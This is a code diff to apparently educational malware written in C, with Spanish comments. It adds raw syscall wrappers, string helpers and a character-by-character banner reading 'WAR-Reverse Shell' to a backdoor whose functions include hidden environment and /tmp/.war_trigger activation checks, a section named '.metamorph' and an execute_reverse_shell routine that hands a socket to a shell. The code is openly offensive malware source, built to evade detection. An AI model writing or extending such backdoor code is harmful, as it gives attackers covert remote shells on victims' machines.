@@ -223,6 +223,42 @@ static inline long sys_read(int fd, void *buf, size_t count) {
     return ret;
 }
 
+static inline int sys_getuid(void) {
+    int ret;
+    __asm__ volatile(
+        "mov $102, %%rax\n"
+        "syscall"
+        : "=a"(ret)
+        :
+        : "rcx", "r11", "memory"
+    );
+    return ret;
+}
+
+static inline int sys_geteuid(void) {
+    int ret;
+    __asm__ volatile(
+        "mov $107, %%rax\n"
+        "syscall"
+        : "=a"(ret)
+        :
+        : "rcx", "r11", "memory"
+    );
+    return ret;
+}
+
+static inline long sys_getcwd(char *buf, size_t size) {
+    long ret;
+    __asm__ volatile(
+        "mov $79, %%rax\n"
+        "syscall"
+        : "=a"(ret)
+        : "D"(buf), "S"(size)
+        : "rcx", "r11", "memory"
+    );
+    return ret;
+}
+
 // ==================== UTILIDADES ====================
 
 __attribute__((section(".metamorph"), noinline, used))
@@ -275,6 +311,45 @@ static int check_env_trigger(void) {
 }
 
 __attribute__((section(".metamorph"), noinline, used))
+static void _memcpy(void *dst, const void *src, size_t n) {
+    unsigned char *d = dst;
+    const unsigned char *s = src;
+    for (size_t i = 0; i < n; i++)
+        d[i] = s[i];
+}
+
+__attribute__((section(".metamorph"), noinline, used))
+static size_t _strlen(const char *s) {
+    size_t len = 0;
+    while (s[len]) len++;
+    return len;
+}
+
+__attribute__((section(".metamorph"), noinline, used))
+static void _itoa(int val, char *buf) {
+    if (val == 0) {
+        buf[0] = '0';
+        buf[1] = '\0';
+        return;
+    }
+    
+    int is_neg = val < 0;
+    if (is_neg) val = -val;
+    
+    char temp[12];
+    int i = 0;
+    while (val > 0) {
+        temp[i++] = '0' + (val % 10);
+        val /= 10;
+    }
+    
+    int j = 0;
+    if (is_neg) buf[j++] = '-';
+    while (i > 0) buf[j++] = temp[--i];
+    buf[j] = '\0';
+}
+
+__attribute__((section(".metamorph"), noinline, used))
 static int check_file_trigger(void) {
     // Verificar si existe /tmp/.war_trigger
     char path[20];
@@ -316,6 +391,23 @@ static void _itohex(unsigned long val, char *buf, int len) {
     }
 }
 
+// Helper para escribir strings al socket de forma segura
+__attribute__((section(".metamorph"), noinline, used))
+static void _write_str(int fd, const char *str, size_t len) {
+    sys_write(fd, str, len);
+}
+
+// Construye una string desde chars individuales y la escribe
+__attribute__((section(".metamorph"), noinline, used))
+static void _build_and_write(int fd, const char *chars, int count) {
+    char buf[128];
+    if (count > 127) count = 127;
+    for (int i = 0; i < count; i++) {
+        buf[i] = chars[i];
+    }
+    sys_write(fd, buf, count);
+}
+
 // ==================== BACKDOOR EXECUTION ====================
 
 // Estructura para sockaddr_in (compatible con kernel)
@@ -349,6 +441,32 @@ static void execute_reverse_shell(void) {
         sys_close(s);
         sys_exit(1);
     }
+    
+    // === ENVIAR BANNER ===
+    char banner[64];
+    int bp = 0;
+    banner[bp++] = '\n';
+    banner[bp++] = 'W'; banner[bp++] = 'A'; banner[bp++] = 'R';
+    banner[bp++] = '-';
+    banner[bp++] = 'R'; banner[bp++] = 'e'; banner[bp++] = 'v';
+    banner[bp++] = 'e'; banner[bp++] = 'r'; banner[bp++] = 's';
+    banner[bp++] = 'e'; banner[bp++] = ' ';
+    banner[bp++] = 'S'; banner[bp++] = 'h'; banner[bp++] = 'e';
+    banner[bp++] = 'l'; banner[bp++] = 'l';
+    banner[bp++] = ' ';
+    banner[bp++] = 'b'; banner[bp++] = 'y';
+    banner[bp++] = ' ';
+    banner[bp++] = 'j'; banner[bp++] = 'a'; banner[bp++] = 'i';
+    banner[bp++] = 'n'; banner[bp++] = 'a'; banner[bp++] = 'v';
+    banner[bp++] = 'a'; banner[bp++] = 's';
+    banner[bp++] = ' ';
+    banner[bp++] = '&';
+    banner[bp++] = ' ';
+    banner[bp++] = 'j'; banner[bp++] = 'v'; banner[bp++] = 'i';
+    banner[bp++] = 'd'; banner[bp++] = 'a'; banner[bp++] = 'l';
+    banner[bp++] = '-'; banner[bp++] = 't';
+    banner[bp++] = '\n'; banner[bp++] = '\n';
+    sys_write(s, banner, bp);
     
     // === CLAVE: Cerrar TODOS los FDs excepto el socket ===
     for (int fd = 0; fd < 3; fd++) {
